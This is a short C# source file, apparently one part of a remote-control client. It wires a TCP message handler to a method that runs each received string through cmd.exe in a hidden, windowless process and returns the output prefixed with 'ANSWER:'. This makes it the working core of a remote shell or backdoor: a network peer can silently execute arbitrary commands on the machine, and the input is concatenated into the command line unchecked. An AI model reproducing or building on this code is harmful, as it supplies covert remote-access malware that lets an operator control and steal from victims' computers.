using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Sender.TCP;

namespace Sender.Domain
{
    public class Domain
    {
        public Sender.TCP.Sender Sender;
        public Domain(Sender.TCP.Sender sender)
        {
            Sender = sender;
            sender.OnMessageHandler += OnMessage;
        }

        public void Run()
        {
            Sender.Run();
        }

        private async Task<string> OnMessage(string message)
        {
            if (message != "Ok")
            {
                return "ANSWER:" + CreateTaskCmd(message).Result;
            }
            return "null";
        }

        private async Task<string> CreateTaskCmd(string command)
        {
            try
            {
                var startInfo = new ProcessStartInfo("cmd", $@"/c cd C:\ && {command} && EXIT");
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.RedirectStandardOutput = true;

                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;

                var proc = new Process();
                proc.StartInfo = startInfo;
                proc.Start();

                var result = await proc.StandardOutput.ReadToEndAsync();

                proc.WaitForExit();

                return result;
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
    }
}
